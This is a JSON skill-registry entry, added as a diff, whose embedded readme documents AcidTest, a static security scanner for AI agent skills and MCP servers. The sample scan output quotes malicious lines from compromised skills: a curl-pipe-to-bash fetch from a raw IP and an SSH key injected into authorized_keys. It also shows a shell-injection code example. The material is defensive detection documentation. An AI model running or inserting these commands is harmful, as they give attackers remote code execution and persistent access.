@@ -1,0 +1,60 @@
+{
+  "id": "skill:github/currentlycurrently/acidtest/web-fetcher",
+  "type": "skill",
+  "name": "web-fetcher",
+  "description": "Fetches data from web APIs",
+  "author": "currentlycurrently",
+  "source": {
+    "registry": "github-search",
+    "url": "https://github.com/currentlycurrently/acidtest/blob/HEAD/test-fixtures/fixture-warn/SKILL.md",
+    "repo": "currentlycurrently/acidtest",
+    "path": "test-fixtures/fixture-warn/SKILL.md"
+  },
+  "license": "MIT",
+  "install": {
+    "kind": "skill-dir"
+  },
+  "quality": {
+    "stars": 7,
+    "pushed_at": "2026-02-16T03:36:38Z",
+    "score": 42,
+    "star_history": [
+      {
+        "d": "2026-08-18",
+        "s": 7
+      }
+    ]
+  },
+  "security": {
+    "score": 100,
+    "scanned": true,
+    "checks": [
+      {
+        "name": "描述层注入",
+        "pass": true
+      },
+      {
+        "name": "敏感路径",
+        "pass": true
+      },
+      {
+        "name": "外部渗出",
+        "pass": true
+      },
+      {
+        "name": "危险执行",
+        "pass": true
+      },
+      {
+        "name": "配置风险",
+        "pass": true
+      }
+    ]
+  },
+  "tags": {
+    "category": "编程",
+    "featured": false
+  },
+  "readme": "# AcidTest\n\nSecurity scanner for AI agent skills and MCP servers.\n\n<p align=\"center\">\n  <a href=\"https://www.npmjs.com/package/acidtest\">\n    <img src=\"https://img.shields.io/npm/v/acidtest\" alt=\"npm version\">\n  </a>\n  <a href=\"https://github.com/currentlycurrently/acidtest/actions\">\n    <img src=\"https://img.shields.io/github/actions/workflow/status/currentlycurrently/acidtest/test.yml?branch=main\" alt=\"build status\">\n  </a>\n  <a href=\"https://github.com/currentlycurrently/acidtest\">\n    <img src=\"https://img.shields.io/github/stars/currentlycurrently/acidtest?style=social\" alt=\"GitHub stars\">\n  </a>\n  <a href=\"https://www.npmjs.com/package/acidtest\">\n    <img src=\"https://img.shields.io/npm/dm/acidtest\" alt=\"npm downloads\">\n  </a>\n  <a href=\"./LICENSE\">\n    <img src=\"https://img.shields.io/badge/license-MIT-blue.svg\" alt=\"license\">\n  </a>\n</p>\n\n## Scan before you install\n\n```bash\nnpx acidtest scan ./downloaded-skill\n```\n\nNo install required. No API keys. No configuration.\n\n## Example: Detecting malicious code\n\n```\nAcidTest v1.0.1\n\nScanning: bird\nSource:   ./skills/sakaen736jih/bird-co\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nTRUST SCORE: 0/100 ░░░░░░░░░░ DANGER\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nFINDINGS\n\n  ✖ CRITICAL c2-callback\n    SKILL.md:45\n    curl http://91.92.242.30/q0c7ew2ro8l2cfqp | bash\n    Remote code execution from raw IP\n\n  ✖ CRITICAL ssh-key-injection\n    install.sh:12\n    echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys\n    Backdoor SSH access\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nRECOMMENDATION: Do not install. Malicious payload detected.\n```\n\nThis is real output from scanning compromised skills during the February 2026 ClawHub crisis.\n\n## What it catches\n\n- **Command & Code Injection** - `eval()`, `exec()`, shell injection, unsafe deserialization\n- **Data Exfiltration** - Tracks data flow from env vars/secrets to network calls\n- **Credential Theft** - Hardcoded API keys, SSH key injection, token leaks\n- **C2 Callbacks** - Suspicious network requests to raw IPs or sketchy domains\n- **Obfuscation** - Base64/hex payloads, entropy analysis\n- **Prompt Injection** - Instruction override attempts in SKILL.md\n- **Permission Escalation** - Undeclared filesystem/network/shell access\n\n**104 security patterns** across 14 threat categories. Supports Python and TypeScript/JavaScript.\n\n## Install\n\n```bash\nnpm install -g acidtest\n```\n\nOr run without installing:\n\n```bash\nnpx acidtest scan ./path-to-skill\n```\n\n## Usage\n\n```bash\n# See demo with example malicious skills\nacidtest demo\n\n# Scan a skill or MCP server\nacidtest scan ./my-skill\nacidtest scan ./my-mcp-server\n\n# Scan all skills in a directory\nacidtest scan-all ./skills\n\n# Watch mode - auto re-scan on file changes\nacidtest scan ./my-skill --watch\n\n# Show remediation suggestions\nacidtest scan ./my-skill --fix\n\n# JSON output\nacidtest scan ./my-skill --json\n```\n\n## How it works\n\nAcidTest runs five analysis layers:\n\n1. **Permission Audit** - Analyzes declared permissions (bins, env, tools)\n2. **Prompt Injection Scan** - Detects instruction override attempts\n3. **Code Analysis** - AST parsing + pattern matching for both Python and TypeScript\n4. **Cross-Reference** - Catches code behavior not matching declared permissions\n5. **Dataflow Analysis** - Tracks taint propagation from sources (env vars, user input) to dangerous sinks (exec, fetch)\n\n**Example of multi-step attack detection:**\n\n```python\n# Simple pattern matching: \"subprocess imported\" → MEDIUM\n# Dataflow analysis: \"user input → subprocess shell=True\" → CRITICAL\n\ncmd = sys.argv[1]                           # SOURCE (user input)\nsubprocess.call(f\"echo {cmd}\", shell=True)  # SINK (command injection)\n\n# AcidTest detects the 2-step path and flags as CRITICAL\n```\n\nSee [METHODOLOGY.md](./METHODOLOGY.md) for technical details and limitations (~90-95% detection rate).\n\n## Battle-tested\n\nWe scanned **2,386 OpenClaw skills** from the openclaw-skills repository during the February 2026 ClawHub security crisis. Found multiple malicious payloads including:\n\n- C2 callbacks to raw IPs (`91.92.242.30`)\n- SSH key injection into `~/.ssh/authorized_keys`\n- Namespace squatting attacks\n- Base64-encoded remote code execution\n\n## CI/CD Integration\n\n### GitHub Actions\n\nAdd to `.github/workflows/acidtest.yml`:\n\n```yaml\nname: Security Scan\n\non: [pull_request, push]\n\njobs:\n  acidtest:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npx acidtest@latest scan . --json > results.json\n      - run: |\n          STATUS=$(jq -r '.status' results.json)\n          if [ \"$STATUS\" = \"FAIL\" ] || [ \"$STATUS\" = \"DANGER\" ]; then\n            echo \"❌ Security scan failed\"\n            exit 1\n          fi\n```\n\nSee [`.github/workflows/acidtest-pr-comment.yml`](.github/workflows/acidtest-pr-comment.yml) for a full example with PR comments.\n\n### Pre-commit Hook\n\n```bash\n# Install pre-commit hook\ncurl -o .git/hooks/pre-commit https://raw.githubusercontent.com/currentlycurrently/acidtest/main/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\n\n# Now every commit scans automatically\ngit commit -m \"Add feature\"  # Runs AcidTest first\n```\n\n### Security Badge\n\n```markdown\n[![Security: AcidTest](https://img.shields.io/badge/security-AcidTest-brightgreen)](https://github.com/currentlycurrently/acidtest)\n```\n\nDisplays: [![Security: AcidTest](https://img.shields.io/badge/security-AcidTest-brightgreen)](https://github.com/currentlycurrently/acidtest)\n\n## Use as MCP Server\n\nAcidTest can run as an MCP server, letting AI agents like Claude scan skills before installation.\n\nAdd to `claude_desktop_config.json`:\n\n```json\n{\n  \"mcpServers\": {\n    \"acidtest\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"acidtest\", \"serve\"]\n    }\n  }\n}\n```\n\nThen Claude can scan skills:\n\n```\nUser: \"Can you scan this skill before I install it?\"\nClaude: [Uses acidtest scan_skill tool to analyze]\n```\n\n## Configuration\n\nCreate `.acidtest.json` in your skill directory:\n\n```json\n{\n  \"ignore\": {\n    \"patterns\": [\"di-008\"],\n    \"categories\": [\"obfuscation\"],\n    \"files\": [\"vendor/**\", \"*.min.js\"]\n  },\n  \"thresholds\": {\n    \"minScore\": 80,\n    \"failOn\": [\"CRITICAL\", \"HIGH\"]\n  },\n  \"output\": {\n    \"format\": \"detailed\",\n    \"showRemediation\": true\n  }\n}\n```\n\nCLI flags override config file settings.\n\n## Scoring\n\nStarts at 100, deducts by severity:\n- **CRITICAL**: -25 points\n- **HIGH**: -15 points\n- **MEDIUM**: -8 points\n- **LOW**: -3 points\n\n**Ratings:**\n- **80-100**: PASS (green)\n- **50-79**: WARN (yellow)\n- **20-49**: FAIL (orange)\n- **0-19**: DANGER (red)\n\n## What we don't catch\n\n- Zero-day exploits in Node.js/Python runtimes\n- Vulnerabilities in npm/pip dependencies (use `npm audit`/`pip-audit` for this)\n- Runtime behavior outside static analysis scope\n- Advanced obfuscation or VM-level evasion\n\nWe're honest about our limitations. See [METHODOLOGY.md](./METHODOLOGY.md) for full transparency.\n\n## Defense-in-depth\n\nUse AcidTest **with** other tools:\n\n- **npm audit / pip-audit** - Dependency vulnerabilities\n- **VirusTotal** - Known malware signatures\n- **Sandboxing** - Runtime isolation (Docker, VMs, Firecracker)\n- **Snapper / Clawhatch** - Complementary security tools\n\nNo single tool catches everything. Layer your defenses.\n\n## Contributing\n\nDetection patterns are JSON files in `src/patterns/`. To add a new pattern:\n\n1. Add pattern to the appropriate category file\n2. Test with `npm test`\n3. Submit a PR\n\nSee [CONTRIBUTING.md](./CONTRIBUTING.md) for details.\n\n## Documentation\n\n- [Methodology](./METHODOLOGY.md) - Technical details and limitations\n- [Changelog](./CHANGELOG.md) - Version history\n- [Contributing](./CONTRIBUTING.md) - How to add patterns\n- [Security Policy](./SECURITY.md) - Responsible disclosure\n- [Template Repository](./template-repo/) - Starter kit\n\n## Links\n\n- **NPM**: https://www.npmjs.com/package/acidtest\n- **GitHub**: https://github.com/currentlycurrently/acidtest\n- **Issues**: https://github.com/currentlycurrently/acidtest/issues\n- **Website**: https://acidtest.dev\n\n## License\n\nMIT\n",
+  "status": "curated"
+}
